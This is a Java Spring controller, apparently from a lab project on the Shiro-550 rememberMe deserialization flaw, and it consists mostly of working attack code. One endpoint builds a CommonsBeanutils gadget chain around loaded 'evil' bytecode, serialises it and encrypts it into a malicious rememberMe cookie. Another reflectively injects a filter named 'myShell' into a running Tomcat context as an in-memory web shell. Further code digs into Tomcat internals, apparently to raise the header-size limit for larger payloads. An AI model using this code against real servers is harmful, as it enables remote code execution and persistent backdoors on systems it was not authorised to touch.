package spring_shiro_550.demo.controller;


import javassist.*;
import org.apache.catalina.Context;
import org.apache.catalina.LifecycleState;

import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.startup.Catalina;
import org.apache.catalina.util.LifecycleBase;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.coyote.http11.AbstractHttp11Protocol;
import org.apache.coyote.http11.Http11InputBuffer;
import org.apache.coyote.http11.Http11NioProtocol;
import org.apache.logging.log4j.util.PropertiesUtil;
import org.apache.shiro.SecurityUtils;
import org.apache.shiro.authc.UsernamePasswordToken;
import org.apache.shiro.crypto.hash.Md5Hash;
import org.apache.shiro.mgt.DefaultSecurityManager;
import org.apache.shiro.realm.SimpleAccountRealm;
import org.apache.shiro.subject.Subject;
import org.apache.shiro.web.mgt.CookieRememberMeManager;
import org.apache.tomcat.util.net.NioEndpoint;
import org.apache.xalan.xsltc.runtime.AbstractTranslet;
import org.apache.xalan.xsltc.trax.TemplatesImpl;
import org.junit.Before;
import org.junit.Test;
import org.mockito.internal.util.reflection.Fields;
import org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader;
import org.springframework.stereotype.Controller;
import org.springframework.stereotype.Service;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import spring_shiro_550.demo.shiro.myEncrypt;

import javax.servlet.*;
import java.awt.peer.SystemTrayPeer;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.security.CodeSource;
import java.util.*;

@RestController
@RequestMapping("/")
public class test {

    public byte[] get_evil_bytes(String path) {
        //        这个是修改 Tomcat 最大 Header头的

        try {
            FileInputStream fileInputStream = new FileInputStream(path);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            int b = -1;
            while ((b = fileInputStream.read()) != -1) {
                byteArrayOutputStream.write(b);
            }
            byte[] evil_bytes = byteArrayOutputStream.toByteArray();

            return evil_bytes;
//            return myEncrypt.encrypt();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    @RequestMapping("test_get")
    @ResponseBody
    public Object getRemeberMeValue(@RequestParam(name = "type") String type) {
//        这个函数用来生成 remeberMe value的
        String path;
        if (type.equals( "inject") ){
            path = "./target/classes/spring_shiro_550/demo/controller/injectTomcatFilter.class";
        } else {
            path = "./target/classes/spring_shiro_550/demo/controller/changeTomcatHeaderSizePayload.class";
        }

        byte[] evil_bytes = get_evil_bytes(path);

        TemplatesImpl templates = new TemplatesImpl();
        setField("_name", "1", templates);
        setField("_bytecodes", new byte[][]{evil_bytes}, templates);

        BeanComparator beanComparator = new BeanComparator("value");

        setField("property", "outputProperties", beanComparator);

        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(1);

        setField("queue", new Object[]{templates, 1}, priorityQueue);
        setField("comparator", beanComparator, priorityQueue);
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(priorityQueue);
            return myEncrypt.encrypt(byteArrayOutputStream.toByteArray());
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }


    public Object getField(String fieldName, Object o) {
        try {
            Class clazz = o.getClass();
            Field f = null;
            while (clazz != Object.class) {
                try {
                    f = clazz.getDeclaredField(fieldName);
                    if (f == null) {

                    } else {
                        break;
                    }
                } catch (NoSuchFieldException e) {
                    clazz = clazz.getSuperclass();
                    continue;
                }
            }
            f.setAccessible(true);
            return f.get(o);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public void setField(String fieldName, Object value, Object o) {
        try {
            Field f = o.getClass().getDeclaredField(fieldName);
            f.setAccessible(true);
            f.set(o, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Object[] getElementData() {
        Object[] elementData = null;
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread[] threads = (Thread[]) getField("threads", threadGroup);
        for (Thread thread : threads) {
//            这个判断确保thread不为空，会增加长度，但是没有报错，看着舒服。
            if (thread != null) {
                Object thread_target = getField("target", thread);
                if (thread_target instanceof Runnable) {
                    if (thread_target.getClass().getName().equals("org.apache.tomcat.util.net.NioEndpoint$Poller")) {
                        elementData = (Object[]) getField("elementData", getField("processors", getField("global", getField("handler", getField("this$0", thread_target)))));
                    }
                }
            }

        }
        return elementData;
    }

    //    我不想再写啦，妈的
    @RequestMapping("/test_xixi")
    @ResponseBody
    public String generate_payload_of_change_tomcat_max_size() {
        WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) classLoader.getResources().getContext();
        ServletContext servletContext = standardContext.getServletContext();
        try {
            Field state_f = LifecycleBase.class.getDeclaredField("state");
            state_f.setAccessible(true);

            state_f.set(standardContext, LifecycleState.STARTING_PREP);

            FilterRegistration.Dynamic filterRegistration = servletContext.addFilter("myShell", new injectTomcatFilter());
            filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, "/*");


            Method filterStart_m = StandardContext.class.getDeclaredMethod("filterStart");
            filterStart_m.invoke(standardContext, null);

            state_f.set(standardContext, LifecycleState.STARTED);

        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }
}